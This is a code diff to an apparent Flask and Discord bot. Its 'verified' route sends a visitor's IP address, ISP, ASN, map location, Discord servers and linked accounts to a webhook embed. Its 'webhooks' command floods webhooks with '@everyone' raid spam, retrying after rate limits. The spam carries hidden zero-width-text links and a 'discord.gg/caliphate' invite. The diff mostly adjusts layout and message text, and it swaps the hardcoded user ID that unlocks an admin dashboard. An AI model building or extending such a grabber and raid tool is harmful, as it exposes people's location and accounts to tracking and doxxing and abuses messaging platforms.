@@ -275,7 +275,6 @@ def verified():
                         "value": (
                             f"**IP**\n`{ip or 'N/A'}`\n\n"
                             f"**ISP**\n`{geo.get('isp') or 'N/A'}`\n\n"
-                            f"**Org**\n`{geo.get('org') or 'N/A'}`\n\n"
                             f"**ASN**\n`{geo.get('as') or 'N/A'}`"
                         )[:1024],
                         "inline": True,
@@ -295,17 +294,17 @@ def verified():
                     {
                         "name": "🗺 Map",
                         "value": f"[Open in Google Maps]({map_url})" if map_url else "`N/A`",
-                        "inline": False,
+                        "inline": True,
                     },
                     {
                         "name": "🏠 Guilds",
                         "value": f"```{(guild_list or 'None')[:1000]}```",
-                        "inline": False,
+                        "inline": True,
                     },
                     {
                         "name": "🔗 Connections",
                         "value": f"```{(connection_list or 'None')[:1000]}```",
-                        "inline": False,
+                        "inline": True,
                     },
                 ],
     
@@ -428,7 +427,7 @@ def dashboard_callback():
 def dashboard():
     if (
         "user_id" not in flask.session
-        or flask.session["user_id"] != "1178709988747780146"
+        or flask.session["user_id"] != "659175115371839498"
     ):
         return flask.redirect("/login")
     try:
@@ -708,7 +707,7 @@ async def webhooks(ctx):
                 if r.status_code == 429:
                     retry_after = r.json().get("retry_after", 1)
                     await asyncio.sleep(retry_after)
-                    await client.post(url, json={"content": "@everyone | NGC | 912 | CHR | TSC | [⠀⠀⠀​​​​​​](https://i.redd.it/qg1k8117swaa1.gif)"})
+                    await client.post(url, json={"content": "@everyone | NGC | 912 | CHR | KAN | [⠀⠀⠀​​​​​​](https://i.redd.it/qg1k8117swaa1.gif) [⠀⠀⠀​​​​​​](https://discord.gg/caliphate) "})
                 elif _ < 19:
                     await asyncio.sleep(1 / 28)  # ~28/sec, under limit
 
